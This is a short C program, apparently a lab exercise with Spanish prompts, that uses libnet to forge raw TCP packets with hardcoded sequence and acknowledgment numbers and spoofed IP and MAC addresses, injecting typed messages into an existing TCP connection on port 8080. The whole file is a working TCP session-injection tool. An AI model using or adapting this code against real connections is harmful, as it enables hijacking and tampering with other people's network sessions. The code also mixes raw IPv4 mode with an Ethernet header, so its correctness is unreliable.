#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <libnet.h>

#define PORTServer 8080 
#define PORTClient 53242

#define MACCLIENT "\xa0\x36\xbc\xaa\x80\x15"
#define MACSERVER "\xa0\x36\xbc\xaa\x80\x15"

#define IPClient "192.168.1.166"
#define IPServer "192.168.1.166"

#define ACK 0x67c5d0d7
#define SQ 0xad9485d2
int accSeq = 5;




void faker(){
    int ID = 0xe2ec;
    
    while(1){
        char message[256];
        printf("Escribe un mensaje a enviar: ");
        fgets(message, sizeof(message), stdin);
        int len = strlen(message);
        
        if(strncmp(message, "exit", 4) == 0){
            break;
        }

        libnet_t *l;
        l = libnet_init(LIBNET_RAW4, NULL, NULL);
        
        uint32_t src_ip = libnet_name2addr4(l, IPClient, LIBNET_RESOLVE);
        uint32_t dst_ip = libnet_name2addr4(l, IPServer, LIBNET_RESOLVE);

        uint8_t MACClient[6], MACServer[6];
       

        libnet_build_tcp(
            PORTClient,         
            PORTServer,         
            SQ + accSeq,            
            ACK,                
            TH_PUSH | TH_ACK,   
            1024,                
            0,                  
            0,                  
            LIBNET_TCP_H,       
            (uint8_t*) message, 
            len,    
            l,                  
            0                   
        );

        
        libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H + strlen(message), 
            0,                  
            ++ID,         
            0,                
            64,                 
            IPPROTO_TCP,        
            0,                 
            src_ip,           
            dst_ip,           
            NULL,              
            0,                  
            l,                  
            0                 
        );

        libnet_build_ethernet(
            (uint8_t *)MACSERVER,  
            (uint8_t *)MACCLIENT,       
            ETHERTYPE_IP,     
            NULL,             
            0,                 
            l,                 
            0                  
        );

    
        libnet_write(l);

        accSeq += len;
    }
}

int main(){
    faker();

}
